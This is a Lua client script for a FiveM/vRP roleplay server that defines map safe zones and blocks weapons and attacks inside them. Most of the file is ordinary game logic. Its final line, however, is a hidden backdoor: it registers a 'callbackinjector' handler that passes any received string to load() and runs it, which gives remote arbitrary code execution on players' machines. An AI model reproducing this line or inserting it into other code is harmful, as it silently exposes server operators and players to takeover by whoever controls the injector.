-- DEFAULT --
local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")

vRP = Proxy.getInterface("vRP")
SFzone = {}
Tunnel.bindInterface("b2k-safezone", SFzone)

SFServer = Tunnel.getInterface("b2k-safezone")

local fields = {
	{ name = "Praça", edges = {
			{ name = "1_1", x = 268.47964477539, y = -868.12677001953, z = 29.128894805908 },
			{ name = "1_2", x = 200.52359008789, y = -1055.7015380859, z = 29.22047996521 },
			{ name = "1_3", x = 113.17356872559, y = -1023.3862304688, z = 29.344791412354 },
			{ name = "1_4", x = 180.10263061523, y = -835.65991210938, z = 31.095739364624},
		}
	},
	--[[{ name = "Hospital", edges = {
			{ name = "2_1", x = 352.11129760742, y = -639.42279052734, z = 29.234003067017 },
			{ name = "2_2", x = 417.15936279297, y = -539.77624511719, z = 28.680839538574 },
			{ name = "2_3", x = 251.51571655273, y = -554.93121337891, z= 43.157627105713 },
			{ name = "2_4", x = 230.11758422852, y = -605.52386474609, z = 42.03885269165 },
		}
    },]]
    { name = "Hospital", edges = {
        { name = "2_1", x = -425.42, y = -418.82, z = 32.59 },
        { name = "2_2", x = -408.83, y = -300.19, z = 34.49 },
        { name = "2_3", x = -471.54, y = -245.56, z= 36.0 },
        { name = "2_4", x = -558.74, y = -283.47, z = 35.03 },
    }
},
	{ name = "Concessionaria", edges = {
			{ name = "2_1", x = -27.0, y = -1116.4, z = 26.59 },
			{ name = "2_2", x = -8.58, y = -1079.17, z = 26.69 },
			{ name = "2_3", x = -54.59, y = -1064.81, z= 27.58},
			{ name = "2_4", x = -67.4, y = -1100.64, z = 25.24},
		}
	},
	--[[{ name = "Delegacia", edges = {
			{ name = "2_1", x = 388.43649291992, y = -960.86950683594, z = 29.409772872925},
			{ name = "2_2", x = 494.7421875, y = -960.98217773438, z = 27.125974655151 },
			{ name = "2_3", x = 494.59036254883, y = -1025.3571777344, z = 28.151178359985 },
			{ name = "2_4", x = 386.3459777832, y = -1039.0723876953, z = 29.282880783081 },
		}
    },]]
    { name = "Mecanica", edges = {
            { name = "2_1", x = -121.66, y = -1777.51, z= 23.02},
            { name = "2_2", x = -139.01, y = -1790.59, z= 25.73 },
            { name = "2_3", x = -83.21, y = -1835.22,z = 27.15 },
            { name = "2_4", x = -65.09, y =  -1812.26,z = 27.36 },
        }
    },
    { name = "Garagem praca", edges = {
            { name = "2_1", x = 242.7424621582, y = -828.58972167969, z = 29.949811935425},
            { name = "2_2", x = 190.45768737793, y = -810.41552734375, z = 31.038536071777 },
            { name = "2_3", x = 234.80424499512, y = -687.60260009766, z = 36.832145690918 },
            { name = "2_4", x = 299.65692138672, y = -701.46496582031, z = 29.306324005127 },
        }
    },
    { name = "Garagem praca", edges = {
            { name = "2_1", x = 242.7424621582, y = -828.58972167969, z = 29.949811935425},
            { name = "2_2", x = 190.45768737793, y = -810.41552734375, z = 31.038536071777 },
            { name = "2_3", x = 234.80424499512, y = -687.60260009766, z = 36.832145690918 },
            { name = "2_4", x = 299.65692138672, y = -701.46496582031, z = 29.306324005127 },
        }
    },
    { name = "Garagem ao lado da praca", edges = {
            { name = "2_1", x = 98.363662719727, y = -805.83734130859, z = 31.294855117798},
            { name = "2_2", x = 40.099510192871, y = -960.69964599609, z = 29.331689834595 },
            { name = "2_3", x = -12.134353637695, y = -942.0068359375, z = 29.252468109131 },
            { name = "2_4", x = 43.060272216797, y = -786.54260253906, z = 31.564014434814 },
        }
    }
    --[[{ name = "Bennys", edges = {
        { name = "2_1", x =-187.25245666504, y = -1293.5069580078, z = 31.295976638794},
        { name = "2_2", x = -186.49954223633, y = -1349.1896972656, z = 31.15832901001 },
        { name = "2_3", x = -248.88511657715, y = -1348.1437988281, z = 31.290096282959 },
        { name = "2_4", x = -250.75230407715, y =-1296.615234375, z = 31.266603469849 },
        }
    }]]
}

--[[ Halloween Event
local isHalloweenEvent = false
RegisterNetEvent("b2k:halloween")
AddEventHandler("b2k:halloween", function(cond)
    local status = false
    if cond == 1 then status = true end

    isHalloweenEvent = status
end)]]

--[[
    FIELD DETECTION
]]
-- Checks if point is within a triange. https://stackoverflow.com/questions/2049582/how-to-determine-if-a-point-is-in-a-2d-triangle
function isPointInTriangle(p, p0, p1, p2)
    local A = 1/2 * (-p1.y * p2.x + p0.y * (-p1.x + p2.x) + p0.x * (p1.y - p2.y) + p1.x * p2.y)
    local sign = 1
    if A < 0 then sign = -1 end
    local s = (p0.y * p2.x - p0.x * p2.y + (p2.y - p0.y) * p.x + (p0.x - p2.x) * p.y) * sign
    local t = (p0.x * p1.y - p0.y * p1.x + (p0.y - p1.y) * p.x + (p1.x - p0.x) * p.y) * sign
    
    return s > 0 and t > 0 and (s + t) < 2 * A * sign
end

function runOnFieldTriangles(field, cb)
    local edges = field.edges
    local num = #edges - 2
    local c = 1
    repeat 
        cb(edges[1], edges[c+1], edges[c+2])
        c = c + 1
    until c > num
end

-- Checks if a point is within a Field structure
function isPointInField(p, field)
    local edges = field.edges
    local within = false
    runOnFieldTriangles(field, function(p0,p1,p2)
        if isPointInTriangle(p, p0, p1, p2) then within = true end
    end)
    return within
end

function GetAreaOfField(field)
    local edges = field.edges
    return math.floor(getAreaOfTriangle(edges[1], edges[2], edges[3]) + getAreaOfTriangle(edges[1], edges[4], edges[3]))
end

function getAreaOfTriangle(p0, p1, p2)
    local b = GetDistanceBetweenCoords(p0.x, p0.y, 0, p1.x, p1.y, 0)
    local h = GetDistanceBetweenCoords(p2.x, p2.y, 0, p1.x, p1.y, 0)
    return (b * h) / 2
end

function debugDrawFieldMarkers(field, r, g, b, a)
    local v = field
    runOnFieldTriangles(v, function(p0,p1,p2) 
        DrawLine(p0.x, p0.y, p0.z + 3.0,
                 p1.x, p1.y, p1.z + 3.0,
            r or 255, g or 0, b or 0, a or 105)
        DrawLine(p2.x, p2.y, p2.z + 3.0,
                 p1.x, p1.y, p1.z + 3.0,
            r or 255, g or 0, b or 0, a or 105)
        DrawLine(p2.x, p2.y, p2.z + 3.0,
                 p0.x, p0.y, p0.z + 3.0,
            r or 255, g or 0, b or 0, a or 105)
    end)
end

function drawText(text)
    if text == "" then return end
    Citizen.InvokeNative(0xB87A37EEB7FAA67D,"STRING")
    AddTextComponentString(text .. "~n~~n~~n~")
    Citizen.InvokeNative(0x9D77056A530643F6, 200, true)
end

local isInSafezone = false

-- Main Thread
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1500)
		local ply = PlayerPedId()
		local pos = GetEntityCoords(ply)
        if IsPedInAnyVehicle(ply) then
            pos = GetEntityCoords(GetVehiclePedIsIn(ply, false))
        end

        --if not isHalloweenEvent then
        isInSafezone = false
        for k,v in next, fields do
            if GetDistanceBetweenCoords(v.edges[1].x, v.edges[1].y,0,pos.x,pos.y,0) <= 500.0 then
                if isPointInField(pos, v) then
                    isInSafezone = true
                --else
                --	isInSafezone = false
                    --NetworkSetFriendlyFireOption(true)
                    --debugDrawFieldMarkers(v)
                end
            end
        end
        --end
    end
end)

Citizen.CreateThread(function()
	while true do
        local perseu = 1000
        if isInSafezone then
            --debugDrawFieldMarkers(v,0,255)
           perseu = 5
		   drawText("~w~Você está em uma ~g~Safezone~w~!")
            ClearPlayerWantedLevel(PlayerId())
            SetCurrentPedWeapon(PlayerPedId(), GetHashKey("WEAPON_UNARMED"), true)
            --NetworkSetFriendlyFireOption(false)
            DisableControlAction(2, 37,  true) -- disable weapon wheel (Tab)
            DisableControlAction(1, 45,  true) -- disable reload
            DisableControlAction(2, 80,  true) -- disable reload
            DisableControlAction(2, 140, true) -- disable reload
            DisableControlAction(2, 250, true) -- disable reload
            DisableControlAction(2, 263, true) -- disable reload
            DisableControlAction(2, 310, true) -- disable reload
            DisableControlAction(1, 140, true)
            DisableControlAction(1, 141, true)
            DisableControlAction(1, 142, true)
            DisableControlAction(1, 143, true)
            DisableControlAction(0, 24,  true) -- disable attack
            DisableControlAction(0, 25,  true) -- disable aim
            --DisableControlAction(0, 47,  true) -- disable weapon
            DisableControlAction(0, 58,  true) -- disable weapon

            DisablePlayerFiring(PlayerPedId(), true) -- Disables firing all together if they somehow bypass inzone Mouse Disable
            DisableControlAction(0, 106, true) -- Disable in-game mouse controls
        end
		Citizen.Wait(perseu)
    end
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)